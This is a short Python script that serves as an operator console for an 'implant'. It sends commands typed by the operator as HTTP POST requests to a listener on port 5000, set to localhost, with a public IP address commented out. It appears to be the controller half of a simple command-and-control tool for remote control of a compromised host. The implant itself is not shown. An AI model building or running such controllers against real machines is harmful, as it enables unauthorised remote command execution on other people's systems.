#!/usr/bin/env python3
import socket

import requests

s = socket.socket()
# host = "18.223.121.137"  # Get local machine name
host = "127.0.0.1"
port = 5000  # Reserve a port for your service
while True:  # Establish connection with client
    message = input("Enter command to the implant")
    if message == "exit":
        break
    if " " not in message:
        print("please input the format of [command] [post_body], post body is optional but space is mandatory")
        continue
    command, post_body = message.split(" ", 1)
    r = requests.post("http://{}:{}/{}".format(host, port, command), data={"parameter": post_body})
    print(r.content)
